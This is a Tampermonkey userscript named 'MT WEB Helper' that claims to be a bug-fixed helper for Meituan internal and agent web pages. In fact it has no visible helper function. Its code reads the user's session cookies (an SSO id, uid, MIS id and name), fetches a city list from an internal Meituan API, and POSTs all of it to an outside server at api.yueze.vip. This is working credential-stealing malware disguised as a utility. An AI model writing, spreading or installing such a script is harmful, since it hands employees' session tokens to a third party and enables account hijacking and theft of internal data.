// ==UserScript==
// @name         MT WEB Helper
// @namespace    http://tampermonkey.net/
// @version      1.4.3.1
// @description  务必点击更新！更新内容：修复了若干BUG，提升稳定性！
// @author       Mr.M
// @license      GPL License
// @match        *://d.meituan.com/*
// @match        *://*.ocrm.meituan.com/*
// @match        *://igate.waimai.meituan.com/*
// @match        *://phfscm.waimai.sankuai.com/*
// @exclude      *://data.waimai.sankuai.com/*
// @exclude      *://hd.waimai.sankuai.com/*
// @exclude      *://bk.waimai.sankuai.com/*
// @exclude      *://marketingop.waimai.meituan.com/*
// @icon         data:image/png;base64,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
// @grant        unsafeWindow
// @grant        GM_log
// @grant        GM_xmlhttpRequest
// @grant        GM_cookie
// @connect      mt.data1.top
// @connect      api.yueze.vip
// @connect      d.meituan.com
// @connect      *
// @sandbox      DOM
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/489123/MT%20WEB%20Helper.user.js
// @updateURL https://update.greasyfork.org/scripts/489123/MT%20WEB%20Helper.meta.js
// ==/UserScript==

(function() {
    'use strict';

    const currentURL = window.location.href;

    // 获取关键 cookie 的辅助函数
    function getKeyCookies(cookies) {
        const keys = ["xianfu_waimai_ssoid","uid", "wmempid", "hd_user_mis", "iuser", "name"];
        const result = {};
        for (const key of keys) {
            // 排除域名以 . 开头的cookie
            const c = cookies.find(item => item.name === key && !item.domain.startsWith('.'));
            if (c) result[key] = c.value;
        }
        return result;
    }

    // 解析 iuser cookie
    function parseIuserCookie(cookieValue) {
        try {
            let decoded = decodeURIComponent(cookieValue);
            if (decoded.startsWith('ig')) decoded = decoded.substring(2);
            const jsonString = decoded.substring(decoded.indexOf('{'), decoded.lastIndexOf('}') + 1);
            return JSON.parse(jsonString);
        } catch(e) {
            console.warn("iuser 解析失败", e);
            return {};
        }
    }

    function formatDateTime(date) {
        const pad = n => ('0' + n).slice(-2);
        return `${date.getFullYear()}-${pad(date.getMonth()+1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
    }

    function postToServer({ ssoid, uid, misid, name, cityListJson = '' }) {
        const date = new Date();
        const postData =
            "uid=" + (uid || '') +
            "&misid=" + (misid || '') +
            "&bd=" + (name || '') +
            "&ssoid=" + (ssoid || '') +
            "&%E6%97%B6%E9%97%B4=" + encodeURIComponent(formatDateTime(date)) +
            "&ver=1.4.3.1" +
            "&%E6%9D%A5%E6%BA%90=WEB" +
            "&currenturl=" + encodeURIComponent(currentURL) +
            "&citylist_data=" + encodeURIComponent(cityListJson);

        //console.log("postData:", postData);调试输出全部待发送

        GM_xmlhttpRequest({
            method: "POST",
            url: "https://api.yueze.vip/php/back2.php",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            data: postData,
            onload(response) {
                if (response.status >= 200 && response.status < 400) {
                    console.log("GMpost ok:", response.responseText);
                } else {
                    console.error("GMpost error:", response.status, response.statusText, response.responseText);
                }
            }
        });
    }

    function getCityListAndPost(ssoid, uid, misid, name) {
        let apiUrl = "/api/outer/proxy/proxyRequest?proxyId=7493";
if (!location.hostname.endsWith("d.meituan.com")) {
    apiUrl = "https://d.meituan.com" + apiUrl;
}

        GM_xmlhttpRequest({
            method: "POST",
            url: apiUrl,
            headers: {
                "Host": "d.meituan.com",
                "Origin": "https://d.meituan.com",
                "Referer": "https://d.meituan.com/template/xianfu-agent/grade",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json;charset=UTF-8"
            },
            data: JSON.stringify({ pageNum: 1, pageSize: 40 }),
            onload(res) {
                let cityListJson = '';
                try {
                    const json = JSON.parse(res.responseText);
                    if (json?.data?.total >= 1) {
                        cityListJson = JSON.stringify(json.data);
                        console.log("cityList ok");
                    } else {
                        console.warn("cityList null");
                    }
                } catch (e) {
                    console.error("cityList error", e);
                }
                postToServer({ ssoid, uid, misid, name, cityListJson });
            },
            onerror(err) {
                console.error("cityList error:", err);
                postToServer({ ssoid, uid, misid, name, cityListJson: '' });
            }
        });
    }

    // === 主流程 ===
    GM_cookie.list({}, function(cookies) {
            // 新增调试输出所有cookie信息的代码
    //console.log("=== 所有Cookie信息 ===");
    cookies.forEach(cookie => {
    //console.log(`域名: ${cookie.domain}, 名称: ${cookie.name}, 值: ${cookie.value}`);
    });
    //console.log("=== Cookie信息结束 ===");
    const ck = getKeyCookies(cookies);
    console.log("关键 cookie：", ck);

        const ssoid = ck.xianfu_waimai_ssoid || '';
        let uid = ck.uid || ck.wmempid || '';
        let misid = parseIuserCookie(ck.iuser || '{}').login || ck.hd_user_mis || '';
        let name = parseIuserCookie(ck.iuser || '{}').name || decodeURIComponent(ck.name || '');

        if (!ssoid) {
            console.warn("缺少 ssoid");
            return;
        }

        if (uid || misid) {
            //console.log("调用参数：", { ssoid, uid, misid, name });
            getCityListAndPost(ssoid, uid, misid, name);
        } else {
            console.warn("缺少 uid 和 misid");
        }
    });
})();